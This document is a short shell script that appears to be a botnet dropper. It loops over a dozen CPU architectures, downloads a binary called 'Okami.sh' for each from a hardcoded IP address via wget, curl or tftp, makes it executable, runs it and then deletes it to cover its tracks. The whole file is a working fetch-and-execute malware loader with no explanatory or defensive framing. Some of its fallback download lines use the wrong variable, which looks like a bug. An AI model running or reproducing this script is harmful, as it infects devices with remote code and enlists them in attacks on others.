binarys="x86_64 arm arm5 arm6 arm7 m68k mips mpsl pps sh4 spc x86"
server_ip="89.32.41.158"
binname="Okami.sh"

for arch in $binarys
do
rm -rf $binname.$arch
wget http://$server_ip/$binname.$arch || curl -O http://$server_ip/$binarys || tftp $server_ip -c get $binarys || tftp -g -r $binarys $server_ip
chmod 777 $binname.$arch
./$binname.$arch $1.$arch
rm -rf $binname.$arch
done
